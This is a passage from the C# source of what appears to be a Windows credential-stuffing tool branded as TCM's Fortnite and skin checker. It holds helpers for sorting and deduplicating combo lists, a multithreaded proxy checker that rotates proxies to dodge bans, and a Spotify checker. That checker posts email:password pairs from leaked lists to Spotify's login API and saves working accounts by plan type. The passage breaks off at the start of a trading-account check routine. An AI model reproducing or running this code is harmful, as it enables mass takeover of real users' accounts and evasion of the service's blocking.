                    System.IO.StreamWriter SaveComboSortedList4 = new System.IO.StreamWriter(StartingDirectory + SaveComboTextboxName4 + ".txt");
                    foreach (var item in ComboSorterListBox4.Items)
                    {
                        SaveComboSortedList4.WriteLine(item);
                    }
                    SaveComboSortedList4.Close();
                }
                catch
                {

                }
            }
            if (ComboSorterListBox5.Items.Count >= 1)
            {
                try
                {
                    if (!Directory.Exists("Provider Splitter"))
                    {
                        Directory.CreateDirectory("Provider Splitter");
                    }
                    string SaveComboTextboxName5 = ComboSorterTextBox5.Text;
                    System.IO.StreamWriter SaveComboSortedList5 = new System.IO.StreamWriter(StartingDirectory + SaveComboTextboxName5 + ".txt");
                    foreach (var item in ComboSorterListBox5.Items)
                    {
                        SaveComboSortedList5.WriteLine(item);
                    }
                    SaveComboSortedList5.Close();
                }
                catch
                {

                }
            }
            if (ComboSorterListBox6.Items.Count >= 1)
            {
                try
                {
                    if (!Directory.Exists("Provider Splitter"))
                    {
                        Directory.CreateDirectory("Provider Splitter");
                    }
                    string SaveComboTextboxName6 = ComboSorterTextBox6.Text;
                    System.IO.StreamWriter SaveComboSortedList6 = new System.IO.StreamWriter(StartingDirectory + SaveComboTextboxName6 + ".txt");
                    foreach (var item in ComboSorterListBox6.Items)
                    {
                        SaveComboSortedList6.WriteLine(item);
                    }
                    SaveComboSortedList6.Close();
                }
                catch
                {

                }
            }
            if (ComboSorterListBox7.Items.Count >= 1)
            {
                try
                {
                    if (!Directory.Exists("Provider Splitter"))
                    {
                        Directory.CreateDirectory("Provider Splitter");
                    }
                    string SaveComboTextboxName7 = ComboSorterTextBox7.Text;
                    System.IO.StreamWriter SaveComboSortedList7 = new System.IO.StreamWriter(StartingDirectory + SaveComboTextboxName7 + ".txt");
                    foreach (var item in ComboSorterListBox7.Items)
                    {
                        SaveComboSortedList7.WriteLine(item);
                    }
                    SaveComboSortedList7.Close();
                }
                catch
                {

                }
            }
            if (ComboSorterListBox8.Items.Count >= 1)
            {
                try
                {
                    if (!Directory.Exists("Provider Splitter"))
                    {
                        Directory.CreateDirectory("Provider Splitter");
                    }
                    string SaveComboTextboxName8 = ComboSorterTextBox8.Text;
                    System.IO.StreamWriter SaveComboSortedList8 = new System.IO.StreamWriter(StartingDirectory + SaveComboTextboxName8 + ".txt");
                    foreach (var item in ComboSorterListBox8.Items)
                    {
                        SaveComboSortedList8.WriteLine(item);
                    }
                    SaveComboSortedList8.Close();
                }
                catch
                {

                }
            }
            MessageBox.Show("File Saved!");
            Process.Start(StartingDirectory);
        }

        private void nsButton26_Click_1(object sender, EventArgs e)
        {
            string StartingDirectory = "Dupes Remover\\";
            if (DupesRemoverOriginalLB.Items.Count < 1 && FoundDuplicatesTextFile.Items.Count < 1 && DupesListBoxRemover.Items.Count < 1)
            {
                MessageBox.Show("ERROR: Please try and get some valid proxies before saving nothing, Crack head :D");
                return;
            }
            if (DupesRemoverOriginalLB.Items.Count >= 1)
            {
                try
                {
                    if (!Directory.Exists("Dupes Remover"))
                    {
                        Directory.CreateDirectory("Dupes Remover");
                    }
                    System.IO.StreamWriter DupesRemoverOriginal = new System.IO.StreamWriter(StartingDirectory + "Original File" + ".txt");
                    foreach (var item in DupesRemoverOriginalLB.Items)
                    {
                        DupesRemoverOriginal.WriteLine(item);
                    }
                    DupesRemoverOriginal.Close();
                }
                catch
                {

                }
            }
            if (FoundDuplicatesTextFile.Items.Count >= 1)
            {
                try
                {
                    if (!Directory.Exists("Dupes Remover"))
                    {
                        Directory.CreateDirectory("Dupes Remover");
                    }
                    System.IO.StreamWriter DupesRemoverFoundDupes = new System.IO.StreamWriter(StartingDirectory + "Dupes Found" + ".txt");
                    foreach (var item in FoundDuplicatesTextFile.Items)
                    {
                        DupesRemoverFoundDupes.WriteLine(item);
                    }
                    DupesRemoverFoundDupes.Close();
                }
                catch
                {

                }
            }
            if (DupesListBoxRemover.Items.Count >= 1)
            {
                try
                {
                    if (!Directory.Exists("Dupes Remover"))
                    {
                        Directory.CreateDirectory("Dupes Remover");
                    }
                    System.IO.StreamWriter DupesRemoverFoundCleaned = new System.IO.StreamWriter(StartingDirectory + "Cleaned No Dupes" + ".txt");
                    foreach (var item in DupesListBoxRemover.Items)
                    {
                        DupesRemoverFoundCleaned.WriteLine(item);
                    }
                    DupesRemoverFoundCleaned.Close();
                }
                catch
                {

                }
            }
            MessageBox.Show("File Saved!");
            Process.Start(StartingDirectory);
        }

        private void LoadSettingsButtonHe_Click(object sender, EventArgs e)
        {
            string LoadSettingsComboSoter1 = Settings.Default["ComboSorter1"].ToString();
            if (LoadSettingsComboSoter1 != "")
            {
                ComboSorterTextBox1.Text = LoadSettingsComboSoter1;
            }
            string LoadSettingsComboSoter2 = Settings.Default["ComboSorter2"].ToString();
            if (LoadSettingsComboSoter2 != "")
            {
                ComboSorterTextBox2.Text = LoadSettingsComboSoter2;
            }
            string LoadSettingsComboSoter3 = Settings.Default["ComboSorter3"].ToString();
            if (LoadSettingsComboSoter3 != "")
            {
                ComboSorterTextBox3.Text = LoadSettingsComboSoter3;
            }
            string LoadSettingsComboSoter4 = Settings.Default["ComboSorter4"].ToString();
            if (LoadSettingsComboSoter4 != "")
            {
                ComboSorterTextBox4.Text = LoadSettingsComboSoter4;
            }
            string LoadSettingsComboSoter5 = Settings.Default["ComboSorter5"].ToString();
            if (LoadSettingsComboSoter5 != "")
            {
                ComboSorterTextBox5.Text = LoadSettingsComboSoter5;
            }
            string LoadSettingsComboSoter6 = Settings.Default["ComboSorter6"].ToString();
            if (LoadSettingsComboSoter6 != "")
            {
                ComboSorterTextBox6.Text = LoadSettingsComboSoter6;
            }
            string LoadSettingsComboSoter7 = Settings.Default["ComboSorter7"].ToString();
            if (LoadSettingsComboSoter7 != "")
            {
                ComboSorterTextBox7.Text = LoadSettingsComboSoter7;
            }
            string LoadSettingsComboSoter8 = Settings.Default["ComboSorter8"].ToString();
            if (LoadSettingsComboSoter8 != "")
            {
                ComboSorterTextBox8.Text = LoadSettingsComboSoter8;
            }
        }

        private void nsButton27_Click(object sender, EventArgs e)
        {
            btnProxy_Click(null, null);
        }




        private void DoWorkRegularProxyChecker()
        {
            _IsGood = true;
            while (_Run)
            {
                lock (tLock)
                {
                    if (Proxies.Count > 5)
                    {

                    }
                    else
                    {
                        _Run = false;
                        _IsGood = false;
                        break;
                    }
                }
                if (Proxies.Count >= 0)
                {
                    while (_IsGood)
                    {
                        if (_Run.Equals(false))
                            return;
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            try
                            {
                                httpRequest.ClearAllHeaders();
                                int ProxyTimeoutTimer = (int)NewProxyTimeOut.Value;
                                httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0";
                                httpRequest.KeepAlive = true;
                                httpRequest.Cookies = new CookieDictionary(false);
                                httpRequest.IgnoreProtocolErrors = true;
                                httpRequest.ConnectTimeout = ProxyTimeoutTimer;
                                httpRequest.AllowAutoRedirect = false;
                                httpRequest.Proxy = GetPClient(Proxies.ElementAt<string>(rnd.Next(Proxies.Count)));
                                httpRequest.Proxy.ConnectTimeout = ProxyTimeoutTimer;
                                try
                                {
                                    string RegularCheckInput = httpRequest.Get(RegularProxyCheckURLToCheck.Text).ToString();
                                    try
                                    {
                                        if (!RegularCheckValidProxies.Items.Contains(httpRequest.Proxy))
                                        {
                                            if(AutoSaveRegularProxies.Checked)
                                            {
                                                using (StreamWriter RegularNewGoodProxies = File.AppendText(RegularGoodProxiesChecked))
                                                {
                                                    RegularNewGoodProxies.WriteLine(httpRequest.Proxy);
                                                }
                                            }
                                            RegularCheckValidProxies.Items.Add(httpRequest.Proxy);
                                        }
                                    }
                                    catch { }
                                    try
                                    {
                                        Proxies.RemoveAll(s => s.TrimStart().StartsWith(httpRequest.Proxy.ToString(), StringComparison.OrdinalIgnoreCase));
                                        Proxies.Remove(httpRequest.Proxy.ToString());
                                    }
                                    catch{}
                                }
                                catch
                                {
                                    try
                                    {
                                        if (!RegularCheckInValidProxies.Items.Contains(httpRequest.Proxy))
                                        {
                                            if (AutoSaveRegularProxies.Checked)
                                            {
                                                using (StreamWriter RegularNewBadProxies = File.AppendText(RegularBadProxiesChecked))
                                                {
                                                    RegularNewBadProxies.WriteLine(httpRequest.Proxy);
                                                }
                                            }
                                            RegularCheckInValidProxies.Items.Add(httpRequest.Proxy);
                                        }
                                    }
                                    catch {}    
                                    try
                                    {
                                        Proxies.RemoveAll(s => s.TrimStart().StartsWith(httpRequest.Proxy.ToString(), StringComparison.OrdinalIgnoreCase));
                                    }
                                    catch{}
                                }
                                CurrentlyCheckingRegularLabel.Text = "Currently Checking: " + httpRequest.Proxy.ToString();
                                UpdateNewProxyInfo();
                            }
                            catch
                            {
                                UpdateNewProxyInfo();
                            }
                         }
                    }
                }
            }
            Thread.Sleep(ThreadSleepCount);
        }

        private void UpdateNewProxyInfo()
        {
            try
            {
                base.Invoke(new MethodInvoker(delegate
                {
                    string formattype = "{0:#,###,###.##}";
                    InValidProxyNewProxy.Text = string.Format(formattype, RegularCheckInValidProxies.Items.Count);
                    InValidProxyNewProxy.Text = string.Format(formattype, RegularCheckInValidProxies.Items.Count);
                    ValidProxyNewProxy.Text = string.Format(formattype, RegularCheckValidProxies.Items.Count);
                    RegularLeftToCheck.Text = string.Format(formattype, Proxies.Count());
                    int number = Process.GetCurrentProcess().Threads.Count;
                    NewProxyThreadsRunning.Text = string.Format(formattype, number);
                    var percent = (double)RegularCheckValidProxies.Items.Count / (double)RegularCheckInValidProxies.Items.Count;
                    string PercentString = percent.ToString();
                    int trimLength = 4;
                    if (PercentString.Length > trimLength) PercentString = PercentString.Remove(trimLength);
                    NewProxyRatio.Text = PercentString.Replace(".", string.Empty) + "%";
                    RegularCheckValidProxies.SelectedIndex = RegularCheckValidProxies.Items.Count - 1;
                    RegularCheckInValidProxies.SelectedIndex = RegularCheckInValidProxies.Items.Count - 1;
                }));
            }
            catch (Exception)
            {

            }
        }





        public void StartWorkRegularProxyChecker()
        {
            isDone = false;
            int ThreadCount = (int)NewProxyThreadsToRun.Value;
            int SleepTimer = (int)NewProxySleepTime.Value;
            Threadscount = ThreadCount;
            ThreadSleepCount = 100;

            for (int i = 0; i < Threadscount; i++)
            {
                Thread thread = new Thread(new ThreadStart(DoWorkRegularProxyChecker));
                thread.IsBackground = true;
                tList.Add(thread);
                thread.Start();
            }
            new Thread(() =>
            {
                while (Proxies.Count > 5)
                {
                    Thread.Sleep(SleepTimer);
                }
                isDone = true;
                base.Invoke(new Action(delegate
                {
                    _Run = false;
                    timer1.Stop();
                    UpdateNewProxyInfo();
                    StartChecking.Enabled = true;
                    StopCheckingProxyAlive.Enabled = false;
                    if (!IfPaauseTheList.Checked)
                    {
                        MessageBox.Show("Brute / Checker has finished successfully.");
                    }
                    else if (IfPaauseTheList.Checked)
                    {
                        MessageBox.Show("Brute / Checker has been paused, Hit Start to start again!");
                    }
                }));
            })
            {
                IsBackground = true
            }.Start();
        }

        private void StartRegularProxyChecker()
        {
            if (!Directory.Exists(string.Format("{0}\\Results", Application.StartupPath)))
            {
                Directory.CreateDirectory(string.Format("{0}\\Results", Application.StartupPath));
            }
            RegularGoodProxiesChecked = Path.Combine(folder, string.Format("Alive Proxies By TCM's Skin Checker.txt", fileName));
            RegularBadProxiesChecked = Path.Combine(folder, string.Format("Dead Proxies By TCM's Skin Checker.txt", fileName));

            if (BtnStartProxies.InvokeRequired)
            {
                BtnStartProxies.Invoke((MethodInvoker)(() => { StartChecking.Enabled = false; }));
            }
            _Run = false;
            if (!IfPaauseTheList.Checked)
            {

            }
            _Run = true;
            StartWorkRegularProxyChecker();
        }

            private void nsButton28_Click(object sender, EventArgs e)
            {
            Uri uriResult;
            bool URLResult = Uri.TryCreate(RegularProxyCheckURLToCheck.Text, UriKind.Absolute, out uriResult)
                && (uriResult.Scheme == Uri.UriSchemeHttp || uriResult.Scheme == Uri.UriSchemeHttps);
            if(!URLResult)
            {
                MessageBox.Show("URL Doesn't seem to be valid, Give it another Go!");
                MessageBox.Show("Please Type The URL Format As Such\nhttps://www.example.com/\nttp://www.example.com/");
                return;
            }
            else if (Proxies.Count <= 0)
            {
                MessageBox.Show("Please Load Some Proxies First!");
                return;
            }
            else
            TotalProxiesLoadedAliveChecker.Text = Proxies.Count.ToString();
            try
            {
                RegularCheckValidProxies.Items.Clear();
                RegularCheckInValidProxies.Items.Clear();
                Thread ThreadRegularProxyChecker = new Thread(StartRegularProxyChecker);
                CheckForIllegalCrossThreadCalls = false;
                ThreadRegularProxyChecker.Start();
                StopCheckingProxyAlive.Enabled = true;
            }
            catch { }
            try
            {
                timer1.Interval = (1000) * (1);
                timer1.Enabled = true;
                timer1.Start();
                startTime = DateTime.Now;
            }
            catch
            {
                MessageBox.Show("An Error Has Occured, Please Message TrynCatchMeh On Instagram with error code: 65896");
            }
        }

        private void RegularLeftToCheck_Click(object sender, EventArgs e)
        {

        }

        private void BtnStartProxies_Click_1(object sender, EventArgs e)
        {
            try
            {
                if (Proxies.Count <= 0)
                {
                    MessageBox.Show("Please Load Some Proxies First!");
                    return;
                }
                else
                ValidProxyListTextBox.Text = null;
                InvalidProxyListTextBox.Text = null;
                TotalProxiesLoadedBannedChecker.Text = Proxies.Count.ToString();
                Thread ThreadProxyStart = new Thread(StartThreadingProxyChecker);
                CheckForIllegalCrossThreadCalls = false;
                ThreadProxyStart.Start();
                StopCheckingBanProxy.Enabled = true;
                BtnStartProxies.Enabled = false;
            }
            catch { }
            try
            {
                timer1.Interval = (1000) * (1);
                timer1.Enabled = true;
                timer1.Start();
                startTime = DateTime.Now;
            }
            catch
            {
                MessageBox.Show("An Error Has Occured, Please Message TrynCatchMeh On Instagram with error code: 65896");
            }
        }

        private void LoadProxyBanCheck_Click(object sender, EventArgs e)
        {
            btnProxy_Click(null, null);
        }

        private void StopCheckingBanProxy_Click(object sender, EventArgs e)
        {
            btnStop_Click(null, null);
        }

        private void SaveValidProxiesBannedChecker_Click(object sender, EventArgs e)
        {
            if (ValidProxyListTextBox.Lines.Length < 1)
            {
                MessageBox.Show("ERROR: Please try and get some valid proxies before saving nothing, Crack head :D");
                return;
            }
            try
            {
                string itemcount = ValidProxyListTextBox.Lines.Length.ToString();
                saveFileDialog4.FileName = itemcount + " Unbanned Proxies By TCM Fortnite Tool";
                saveFileDialog4.Filter = "Text File | *.txt";
                if (saveFileDialog4.ShowDialog() == DialogResult.OK)
                {
                    ValidProxiesPath = saveFileDialog4.FileName;
                }
            }
            catch
            {
                MessageBox.Show("OOPS: Some bad shit wen't down, Give it another try!");
            }
            try
            {
                using (StreamWriter sw = new StreamWriter(ValidProxiesPath))
                {
                    sw.WriteLine(ValidProxyListTextBox.Text);
                }
            }
            catch
            {

            }
            ValidProxiesPath = null;
        }

        private void SaveinValidProxiesBannedChecker_Click(object sender, EventArgs e)
        {
            if (InvalidProxyListTextBox.Lines.Count() < 1)
            {
                MessageBox.Show("ERROR: Please try and get some valid proxies before saving nothing, Crack head :D");
                return;
            }
            try
            {
                string itemcount = InvalidProxyListTextBox.Lines.Count().ToString();
                saveFileDialog5.FileName = itemcount + " Banned Proxies By TCM Fortnite Tool";
                saveFileDialog5.Filter = "Text File | *.txt";
                if (saveFileDialog5.ShowDialog() == DialogResult.OK)
                {
                    InValidProxiesPath = saveFileDialog5.FileName;
                }
            }
            catch
            {
                MessageBox.Show("OOPS: Some bad shit wen't down, Give it another try!");
            }
            try
            {
                using (StreamWriter sw = new StreamWriter(InValidProxiesPath))
                {
                    sw.WriteLine(InvalidProxyListTextBox.Text);
                }
            }
            catch { }
            InValidProxiesPath = null;
        }

        private void NewProxiesSaveValid_Click(object sender, EventArgs e)
        {
            if (RegularCheckValidProxies.Items.Count < 1)
            {
                MessageBox.Show("ERROR: Please try and get some valid proxies before saving nothing, Crack head :D");
                return;
            }
            try
            {
                string itemcount = RegularCheckValidProxies.Items.Count.ToString();
                saveFileDialog6.FileName = itemcount + " Alive Proxies By TCM Fortnite Tool";
                saveFileDialog6.Filter = "Text File | *.txt";
                if (saveFileDialog6.ShowDialog() == DialogResult.OK)
                {
                    AliveProxiesPath = saveFileDialog6.FileName;
                }
            }
            catch
            {
                MessageBox.Show("OOPS: Some bad shit wen't down, Give it another try!");
            }
            try
            {
                System.IO.StreamWriter SaveFileAlive = new System.IO.StreamWriter(AliveProxiesPath);
                foreach (var item in RegularCheckValidProxies.Items)
                {
                    SaveFileAlive.WriteLine(item);
                }
                SaveFileAlive.Close();
            }
            catch
            {

            }
            AliveProxiesPath = null;
        }

        private void NewProxiesSaveInValid_Click(object sender, EventArgs e)
        {
            if (RegularCheckInValidProxies.Items.Count < 1)
            {
                MessageBox.Show("ERROR: Please try and get some valid proxies before saving nothing, Crack head :D");
                return;
            }
            try
            {
                string itemcount = RegularCheckInValidProxies.Items.Count.ToString();
                saveFileDialog6.FileName = itemcount + " Alive Proxies By TCM Fortnite Tool";
                saveFileDialog6.Filter = "Text File | *.txt";
                if (saveFileDialog6.ShowDialog() == DialogResult.OK)
                {
                    DeadProxiesPath = saveFileDialog6.FileName;
                }
            }
            catch
            {
                MessageBox.Show("OOPS: Some bad shit wen't down, Give it another try!");
            }
            try
            {
                System.IO.StreamWriter DeadFileAlive = new System.IO.StreamWriter(DeadProxiesPath);
                foreach (var item in RegularCheckInValidProxies.Items)
                {
                    DeadFileAlive.WriteLine(item);
                }
                DeadFileAlive.Close();
            }
            catch
            {

            }
            DeadProxiesPath = null;
        }

        private void StartCheckingProxyAlive_Click(object sender, EventArgs e)
        {
            btnStop_Click(null, null);
        }

        private void SpotifyCheckerLoadCombos_Click(object sender, EventArgs e)
        {
            btnCombo_Click(null, null);
        }

        public void DoWorkSpotifyChecker()
        {
            string account = string.Empty;
            int SleepTimer = (int)SpotifyTimeout.Value;
            _IsGood = true;
            while (_Run)
            {

                lock (tLock)
                {
                    if (index < Combo.Count)
                    {
                        account = Combo.ElementAt<string>(index);
                        index = index + 1;
                        Console.WriteLine(index);
                    }
                    else
                        break;
                }
                string[] strArray = account.Split(new char[3]
                {
          ';',
          ':',
          '|'
                });
                if (account.Length >= 2)
                {

                    while (_IsGood)
                    {

                        if (_Run.Equals(false))
                            return;
                        try
                        {
                            using (HttpRequest httpRequest = new HttpRequest())
                            {

                                httpRequest.UserAgent = xNet.Http.ChromeUserAgent();
                                httpRequest.Cookies = new CookieDictionary(false);
                                httpRequest.ConnectTimeout = 10000;
                                httpRequest.AllowAutoRedirect = true;
                                httpRequest.KeepAlive = true;
                                httpRequest.IgnoreProtocolErrors = true;
                                string text2 = httpRequest.Get("https://accounts.spotify.com/en/login", null).Cookies.ToString();
                                httpRequest.AddParam("csrf_token", text2.Replace("csrf_token=", ""));
                                httpRequest.AddHeader("cookie", text2 + "; __bon=MHwwfDEyMDI2MzkyMTd8NTA1MTA4NDcxMTR8MXwxfDF8MQ==;");
                                httpRequest.AddParam("username", strArray[0]);
                                httpRequest.AddParam("password", strArray[1]);
                                httpRequest.AddParam("remember", "true");
                                string text3 = httpRequest.Post("https://accounts.spotify.com/api/login").ToString();
                                string string_ = httpRequest.Get("https://www.spotify.com/us/account/overview/", null).ToString();
                                if (text3.Contains("displayName"))
                                {
                                    string text5 = sortRegex(string_, "class=\"product-name\">", "</h3>");

                                    if (text5.Contains("Spotify Premium"))
                                    {
                                        //Premium
                                        try
                                        {
                                            if (!SpotifyPremiumAccountsBox.Text.Contains(account))
                                            {
                                                using (StreamWriter SaveSpotifyPremium = File.AppendText(SpotifyAccountPremium))
                                                {
                                                    SaveSpotifyPremium.WriteLine(account);
                                                }
                                                Interlocked.Increment(ref SpotifyPremiumAccounts);
                                                Interlocked.Increment(ref SpotifyValid);
                                                SpotifyPremiumAccountsBox.Text += account + Environment.NewLine;
                                            }
                                        }
                                        catch { }
                                        SpotifyPremiumAccountsBox.SelectionStart = SpotifyPremiumAccountsBox.TextLength;
                                        SpotifyPremiumAccountsBox.ScrollToCaret();
                                        break;
                                    }
                                    if (text5.Contains("Spotify Free"))
                                    {
                                        //  Free
                                        try
                                        {
                                            if (!SpotifyFreeAccountsBox.Text.Contains(account))
                                            {
                                                using (StreamWriter SaveSpotifyFree = File.AppendText(SpotifyAccountFree))
                                                {
                                                    SaveSpotifyFree.WriteLine(account);
                                                }
                                                Interlocked.Increment(ref SpotifyFreeAccounts);
                                                Interlocked.Increment(ref SpotifyValid);
                                                SpotifyFreeAccountsBox.Text += account + Environment.NewLine;
                                            }
                                        }
                                        catch { }
                                        SpotifyFreeAccountsBox.SelectionStart = SpotifyFreeAccountsBox.TextLength;
                                        SpotifyFreeAccountsBox.ScrollToCaret();
                                        break;
                                    }
                                    if (text5.Contains("Premium for Family"))
                                    {
                                        // Family
                                        try
                                        {
                                            if (!SpotifyFamilyAccountsBox.Text.Contains(account))
                                            {
                                                using (StreamWriter SaveSpotifyFamily = File.AppendText(SpotifyAccountFamily))
                                                {
                                                    SaveSpotifyFamily.WriteLine(account);
                                                }
                                                Interlocked.Increment(ref SpotifyFamilyAccounts);
                                                Interlocked.Increment(ref SpotifyValid);
                                                SpotifyFamilyAccountsBox.Text += account + Environment.NewLine;
                                            }
                                        }
                                        catch { }
                                        SpotifyFamilyAccountsBox.SelectionStart = SpotifyFamilyAccountsBox.TextLength;
                                        SpotifyFamilyAccountsBox.ScrollToCaret();
                                        break;
                                    }
                                    else
                                    {
                                        // student
                                        try
                                        {
                                            if (!SpotifyStudentAccountsBox.Text.Contains(account))
                                            {
                                                using (StreamWriter SaveSpotifyStudent = File.AppendText(SpotifyAccountStudent))
                                                {
                                                    SaveSpotifyStudent.WriteLine(account);
                                                }
                                                Interlocked.Increment(ref SpotifyStudentAccounts);
                                                Interlocked.Increment(ref SpotifyValid);
                                                SpotifyStudentAccountsBox.Text += account + Environment.NewLine;
                                            }
                                        }
                                        catch { }
                                        SpotifyStudentAccountsBox.SelectionStart = SpotifyStudentAccountsBox.TextLength;
                                        SpotifyStudentAccountsBox.ScrollToCaret();
                                        break;
                                    }
                                }
                                else
                                {
                                    using (StreamWriter SaveSpotifyInvalid = File.AppendText(InvalidSpotifyAccount))
                                    {
                                        SaveSpotifyInvalid.WriteLine(account);
                                    }
                                    Interlocked.Increment(ref SpotifyInvalid);
                                    break;
                                }
                            }
                        }
                        catch (Exception e)
                        {
                            Interlocked.Increment(ref SpotifyErrors);
                        }
                    }
                    Interlocked.Increment(ref SpotifyChecked);
                    Interlocked.Increment(ref SpotifyTotalDone);
                }
            }
            Thread.Sleep(SleepTimer);
        }


        private void UpdateSpotifyStatus()
        {
            try
            {
                base.Invoke(new MethodInvoker(delegate
                {
                    string formattype = "{0:#,###,###.##}";
                    SpotifyCheckerTotalDone.Text = string.Format(formattype, SpotifyTotalDone);
                    SpotifyCheckerErrors.Text = string.Format(formattype, SpotifyErrors);
                    SpotifyCheckerChecked.Text = string.Format(formattype, SpotifyChecked);
                    SpotifyCheckerInvalid.Text = string.Format(formattype, SpotifyInvalid);
                    SpotifyCheckerValids.Text = string.Format(formattype, SpotifyValid);
                    SpotifyCheckerStudentAccounts.Text = string.Format(formattype, SpotifyStudentAccounts);
                    SpotifyCheckerFamilyAccounts.Text = string.Format(formattype, SpotifyFamilyAccounts);
                    SpotifyCheckerPremiumAccounts.Text = string.Format(formattype, SpotifyPremiumAccounts);
                    SpotifyCheckerFreeAccounts.Text = string.Format(formattype, SpotifyFreeAccounts);
                    SpotifyCheckerChecked.Text = string.Format(formattype, SpotifyTotalDone + "/" + Combo.Count);
                    int ThreadNumber = Process.GetCurrentProcess().Threads.Count;
                    SpotifyCheckerThreadsRunning.Text = string.Format(formattype, ThreadNumber);
                }));
            }
            catch (Exception)
            {
                MessageBox.Show("ERROR");
            }
        }


        public static string sortRegex(string string_9, string string_10, string string_11)
        {
            return Regex.Match(string_9, string_10 + "(.*?)" + string_11).Groups[1].Value;
        }

        public void StartDoingworkSpotify()
        {
            isDone = false;
            int ThreadCount = (int)SpotifyThreadsToRun.Value;
            int SleepTimer = (int)SpotifySleepTimer.Value;
            Threadscount = ThreadCount;

            ThreadSleepCount = 100;

            for (int i = 0; i < ThreadCount; i++)
            {
                Thread thread = new Thread(new ThreadStart(DoWorkSpotifyChecker));
                thread.IsBackground = true;
                tList.Add(thread);
                thread.Start();
            }
            new Thread(() =>
            {
                while (!isCompleted())
                {
                    UpdateSpotifyStatus();
                    Thread.Sleep(SleepTimer);
                }
                isDone = true;
                base.Invoke(new Action(delegate
                {
                    _Run = false;
                    timer1.Stop();
                    if (!IfPaauseTheList.Checked)
                    {
                        MessageBox.Show("Brute / Checker has finished successfully.");
                    }
                    else if (IfPaauseTheList.Checked)
                    {
                        MessageBox.Show("Brute / Checker has been paused, Hit Start to start again!");
                    }
                }));
            })
            {
                IsBackground = true
            }.Start();
        }

        private void StartThreadingSpotifyWork()
        {
            if (!Directory.Exists(string.Format("{0}\\Results", Application.StartupPath)))
            {
                Directory.CreateDirectory(string.Format("{0}\\Results", Application.StartupPath));
            }
            if (!Directory.Exists(folder + "\\Spotify Accounts\\"))
            {
                Directory.CreateDirectory(folder + "\\Spotify Accounts\\");
            }

            SpotifyAccountFree = Path.Combine(folder + "\\Spotify Accounts\\", string.Format("Free Spotify Accounts By TCM's Checker.txt", fileName));
            SpotifyAccountPremium = Path.Combine(folder + "\\Spotify Accounts\\", string.Format("Premium Spotify Accounts By TCM's Checker.txt", fileName));
            SpotifyAccountStudent = Path.Combine(folder + "\\Spotify Accounts\\", string.Format("Student Spotify Accounts By TCM's Checker.txt", fileName));
            SpotifyAccountFamily = Path.Combine(folder + "\\Spotify Accounts\\", string.Format("Family Spotify Accounts By TCM's Checker.txt", fileName));
            InvalidSpotifyAccount = Path.Combine(folder + "\\Spotify Accounts\\", string.Format("Invalid Spotify Accounts By TCM's Checkerr.txt", fileName));
            GoogleHomeMiniSpotify = Path.Combine(folder + "\\Spotify Accounts\\", string.Format("Home Mini Accounts By TCM's Checkerr.txt", fileName));

            _Run = false;
            if (!IfPaauseTheList.Checked)
            {
                SpotifyTotalDone = 0;
                SpotifyErrors = 0;
                SpotifyChecked = 0;
                SpotifyInvalid = 0;
                SpotifyValid = 0;
                SpotifyStudentAccounts = 0;
                SpotifyFamilyAccounts = 0;
                SpotifyPremiumAccounts = 0;
                SpotifyFreeAccounts = 0;
            }
            _Run = true;
            if (cmbProxyType.InvokeRequired)
            {
                cmbProxyType.Invoke((MethodInvoker)(() => { SetEnum(cmbProxyType.SelectedIndex); }));
            }
            StartDoingworkSpotify();
        }

        private void SpotifyCheckerStart_Click(object sender, EventArgs e)
        {
            try
            {
                if (Combo.Count <= 0)
                {
                    MessageBox.Show("Please Load Some Combos First!");
                    return;
                }
                else
                {
                    timer3.Interval = (1000) * (1);
                    timer3.Enabled = true;
                    timer3.Start();
                    startTime = DateTime.Now;
                    SpotifyFreeAccountsBox.Text = null;
                    SpotifyPremiumAccountsBox.Text = null;
                    SpotifyFamilyAccountsBox.Text = null;
                    SpotifyStudentAccountsBox.Text = null;
                    Thread StartSpotifyChecking = new Thread(StartThreadingSpotifyWork);
                    CheckForIllegalCrossThreadCalls = false;
                    StartSpotifyChecking.Start();
                }

            }
            catch { }
            try
            {
                timer1.Interval = (1000) * (1);
                timer1.Enabled = true;
                timer1.Start();
                startTime = DateTime.Now;
            }
            catch
            {
                MessageBox.Show("An Error Has Occured, Please Message TrynCatchMeh On Instagram with error code: 65896");
            }
        }

        private void nsButton28_Click_1(object sender, EventArgs e)
        {
            btnStop_Click(null, null);
        }

        private void timer3_Tick(object sender, EventArgs e)
        {
            elapsedTime2 = DateTime.Now - startTime;
            SpotifyCheckerTimeRunning.Text = elapsedTime.ToString();
        }

        private void SpeakStatsSpotify()
        {
            TellStatsButton.Visible = false;
            speech("Hello, We are about to tell you your current stats for this check");
            speech("You Currently Have " + SpotifyCheckerTotalDone.Text + " Checks Done, " + SpotifyCheckerInvalid.Text + " Which Are Invalid and " + SpotifyCheckerValids.Text + " Which are valid!" + "Which Leaves You With Having " + SpotifyCheckerErrors.Text + " Errors");
            speech("Currently There Are " + SpotifyCheckerFreeAccounts.Text + " Accounts That Are Free Accounts");
            speech("Currently There Are " + SpotifyCheckerStudentAccounts.Text + " Accounts That Are Student Accounts");
            speech("Currently There Are " + SpotifyCheckerFamilyAccounts.Text + " Accounts That Are Family Accounts");
            speech("Currently There Are " + SpotifyCheckerPremiumAccounts.Text + " Accounts That Are Premium Accounts");
            int CurrentChecksLeftToDo = Combo.Count - SpotifyTotalDone;
            string formattype = "{0:#,###,###.##}";
            string TotalLeftToCheck = string.Format(formattype, CurrentChecksLeftToDo);
            speech("You Still Have Around " + TotalLeftToCheck + " Accounts Left To Check");
            TellStatsButton.Visible = true;
        }

        private void TellStatsButton_Click(object sender, EventArgs e)
        {
            Thread SpeakSpotifyStats = new Thread(SpeakStatsSpotify);
            CheckForIllegalCrossThreadCalls = false;
            SpeakSpotifyStats.Start();
        }


        public string GenerateRandomCryptographicKey(int keyLength)
        {
            RNGCryptoServiceProvider rngCryptoServiceProvider = new RNGCryptoServiceProvider();
            byte[] randomBytes = new byte[keyLength];
            rngCryptoServiceProvider.GetBytes(randomBytes);
            return Convert.ToBase64String(randomBytes);
        }

        private void TradingAccountCheck(string Email, string Password)
        {
            if (!Directory.Exists(string.Format("{0}\\Results", Application.StartupPath)))
            {
                Directory.CreateDirectory(string.Format("{0}\\Results", Application.StartupPath));
            }
            textfile = Path.Combine(folder, string.Format("Skins Checked By TCM's Skin Checker.txt", fileName));
            validaccounts = Path.Combine(folder, string.Format("Valid Accounts Checked By TCM's Skin Checker.txt", fileName));
